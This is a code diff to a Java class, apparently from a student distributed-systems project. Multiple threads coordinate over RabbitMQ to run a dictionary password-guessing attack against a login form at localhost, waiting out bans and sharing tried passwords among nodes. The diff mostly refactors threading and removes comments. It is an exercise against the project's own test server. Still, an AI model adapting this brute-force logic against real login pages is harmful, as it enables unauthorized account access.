@@ -30,7 +30,7 @@ import com.rabbitmq.client.Envelope;
 
 import java.util.concurrent.TimeUnit;
 
-public class Attaccker implements Runnable {
+public class Attaccker extends Thread {
 
 	private List<String> cookies;
 	private HttpURLConnection conn;
@@ -41,26 +41,24 @@ public class Attaccker implements Runnable {
 	private String dictonary;
 	private boolean passwFound;
 	private boolean ban;
-
+	//private Thread t;
 	private String exName;
 	private ConnectionFactory factory;
 	private Connection connection;
 	private Channel channel;
-	// private String message;
 	private String name;
 	private String queueName;
 
-	private ArrayList<String> passwordRecieved = new ArrayList<String>(); // indici delle password ricevute da altri
-																			// client
+	private ArrayList<String> passwordRecieved = new ArrayList<String>(); // indici password ricevute da altri client
 
-	private String passwToSend[] = new String[3]; // array che contiene gli indici delle password che verranno mandate
-													// tramite POST
+	private String passwToSend[] = new String[3]; // array degli indici delle password che verranno mandate tramite POST
 	private int response[] = new int[3]; // array che contiene gli stati http
-	private Thread t;
 
 	public Attaccker(String url, String login, String dictonary, String exName, String name)
 			throws IOException, TimeoutException {
-
+		
+		super("MyThread");
+		
 		this.url = url;
 		this.login = login;
 		this.dictonary = dictonary;
@@ -82,31 +80,24 @@ public class Attaccker implements Runnable {
 
 	}
 
-	// String result = http.GetPageContent(login);
-	// System.out.println(result);
-
-	public void start() {
+	/*public void start() {
 		if (t == null) {
 			t = new Thread(this);
 			t.start();
 		}
-	}
+	}*/
 
 	public void run() {
 
-		// make sure cookies is turn on
 		CookieHandler.setDefault(new CookieManager());
 
-		// 1. Send a "GET" request, so that you can extract the form's data.
 		String page = null;
 		try {
 			page = this.GetPageContent(url);
 		} catch (Exception e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
-		// String[] data = readDictonaryAttack(dictonary);
 		ArrayList<String> data = null;
 		try {
 			data = readDictonaryAttack(dictonary);
@@ -127,18 +118,15 @@ public class Attaccker implements Runnable {
 				try {
 					postParams = this.getFormParams(page, "prova", passwToSend[i]);
 				} catch (UnsupportedEncodingException e) {
-					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
 				try {
 					response[i] = this.sendPost(login, postParams);
 				} catch (Exception e) {
-					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
 			}
 
-			// Qui si deve considerare response[] ed agire di conseguenza.
 			for (int i = 0; i < response.length; i++) {
 				
 				if (response[i] == 200) {
@@ -146,28 +134,21 @@ public class Attaccker implements Runnable {
 					try {
 						sendMessage("OKAY;" + passwToSend[i]);
 					} catch (IOException e) {
-						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
 					setPasswFound(true);
 				} else if (response[i] == 271) {
 					// 0. inviare password agli altri nodi
 					try {
-						sendMessage(getName() + ";" + passwToSend[i]);
+						sendMessage(getNameAttack() + ";" + passwToSend[i]);
 					} catch (IOException e) {
-						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
-
 					passwordRecieved.add(passwToSend[i]);
+					
 					// 1. Aggiornare la password che ha ritornato errore di autenticazione
 					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 				} else if (response[i] == 270) {
-					// 0. invio indici provati agli altri nodi
-					/*
-					 * try { sendMessage(getName()+";"+passwToSend[i]); } catch (IOException e) { //
-					 * TODO Auto-generated catch block e.printStackTrace(); }
-					 */
 					// 1. Aggiornare la password che ha ritornato errore di autenticazione
 					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 					ban = true;
@@ -181,16 +162,14 @@ public class Attaccker implements Runnable {
 					try {
 						postParams = this.getFormParams(page, "prova", "a");
 					} catch (UnsupportedEncodingException e1) {
-						// TODO Auto-generated catch block
 						e1.printStackTrace();
 					}
 					int a = 0;
 					do {
-						// sleep x secondi prima di ritentare
+						// sleep 20 secondi prima di ritentare
 						try {
-							TimeUnit.SECONDS.sleep(5);
+							TimeUnit.SECONDS.sleep(20);
 						} catch (InterruptedException e) {
-							// TODO Auto-generated catch block
 							e.printStackTrace();
 						}
 						if (getPasswFound())
@@ -199,7 +178,6 @@ public class Attaccker implements Runnable {
 							try {
 								a = this.sendPost(login, postParams);
 							} catch (Exception e) {
-								// TODO Auto-generated catch block
 								e.printStackTrace();
 							}
 						}
@@ -252,17 +230,12 @@ public class Attaccker implements Runnable {
 		URL obj = new URL(url);
 		conn = (HttpURLConnection) obj.openConnection();
 
-		// Acts like a browser
 		conn.setUseCaches(false);
 		conn.setRequestMethod("POST");
 		conn.setRequestProperty("Host", "localhost:8080");
 		conn.setRequestProperty("User-Agent", USER_AGENT);
 		conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
-		/*
-		 * for (String cookie : this.cookies) { conn.addRequestProperty("Cookie",
-		 * cookie.split(";", 1)[0]); }
-		 */
 		conn.setRequestProperty("Connection", "keep-alive");
 		conn.setRequestProperty("Referer", "http://localhost:8080/Distribuiti/login.html");
 		conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
@@ -278,9 +251,8 @@ public class Attaccker implements Runnable {
 		wr.close();
 
 		int responseCode = conn.getResponseCode();
-		// System.out.println("\nSending 'POST' request to URL : " + url);
-		System.out.println(name + ": Post parameters : " + postParams);
-		System.out.println(name + ": receive the following Response Code : " + responseCode + "\n");
+		//System.out.println(name + ": Post parameters : " + postParams);
+		//System.out.println(name + ": receive the following Response Code : " + responseCode + "\n");
 
 		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 		String inputLine;
@@ -290,7 +262,6 @@ public class Attaccker implements Runnable {
 			response.append(inputLine);
 		}
 		in.close();
-		// System.out.println(response.toString());
 
 		return responseCode;
 	}
@@ -314,9 +285,6 @@ public class Attaccker implements Runnable {
 				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
 			}
 		}
-		// int responseCode = conn.getResponseCode();
-		// System.out.println("\nSending 'GET' request to URL : " + url);
-		// System.out.println("Response Code : " + responseCode);
 
 		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 		String inputLine;
@@ -336,11 +304,8 @@ public class Attaccker implements Runnable {
 
 	private String getFormParams(String html, String username, String password) throws UnsupportedEncodingException {
 
-		// System.out.println("Extracting form's data...");
-
 		Document doc = Jsoup.parse(html);
 
-		// Google form id
 		Element loginform = doc.getElementById("formLogin");
 		Elements inputElements = loginform.getElementsByTag("input");
 		inputElements.remove(2);
@@ -381,7 +346,7 @@ public class Attaccker implements Runnable {
 
 	public void receivedMessage() throws IOException, TimeoutException {
 
-		System.out.println(name + " Waiting for messages. To exit press CTRL+C");
+		//System.out.println(name + " Waiting for messages. To exit press CTRL+C");
 
 		Consumer consumer = new DefaultConsumer(channel) {
 			@Override
@@ -392,15 +357,14 @@ public class Attaccker implements Runnable {
 				mexReceived = mexReceived.split(";")[1];
 
 				if (!(sender.equalsIgnoreCase("OKAY"))) {
-					if (!(sender.equalsIgnoreCase(getName()))) {
+					if (!(sender.equalsIgnoreCase(getNameAttack()))) {
 						passwordRecieved.add(mexReceived);
-						System.out.println(getName() + " HA RICEVUTO DA " + sender + ": " + mexReceived + "\n");
-						System.out.println(
-								getName() + " HA IL SEGUENTE passwordRecieved " + passwordRecieved.toString() + "\n");
+						System.out.println(getNameAttack() + " HA RICEVUTO DA " + sender + ": " + mexReceived + "\n");
+						//System.out.println(getNameAttack() + " HA IL SEGUENTE passwordRecieved " + passwordRecieved.toString() + "\n");
 					}
 				} else {
 					setPasswFound(true);
-					System.out.println(sender + " ha Trovato la Password: " + mexReceived + "\n");
+					System.out.println("Password TROVATA: " + mexReceived + "\n");
 				}
 			}
 		};
@@ -408,8 +372,7 @@ public class Attaccker implements Runnable {
 		this.channel.basicConsume(this.queueName, true, consumer);
 	}
 
-	private String getName() {
-		String a = this.name;
-		return a;
+	public String getNameAttack() {
+		return this.name;
 	}
 }
